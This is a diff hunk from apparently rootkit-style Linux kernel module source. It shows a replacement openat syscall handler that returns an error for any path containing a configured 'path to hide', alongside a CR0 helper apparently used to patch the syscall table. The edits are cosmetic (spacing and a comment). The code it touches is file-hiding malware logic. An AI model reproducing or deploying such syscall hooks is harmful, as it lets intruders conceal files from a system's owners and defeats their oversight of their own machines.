@@ -35,12 +35,12 @@ static inline void one_cr0(void) {
 }
 
 int new_openat(const struct pt_regs *regs) {
-    void *path_name_pointer = (void *)regs->si;
+    void *path_name_pointer = (void*)regs->si;
     char *path;
     path = kmalloc(PATH_MAX, GFP_KERNEL);
-    copy_from_user((void *)path, path_name_pointer, PATH_MAX);
+    copy_from_user((void*)path, path_name_pointer, PATH_MAX);
 
-    // If the target is inside the path we're trying to hide, return an error.
+    // If the target is contained within/is the path we're trying to hide, return an error.
     if (strstr(path, path_to_hide) != NULL) {
         kfree(path);
         return -1;
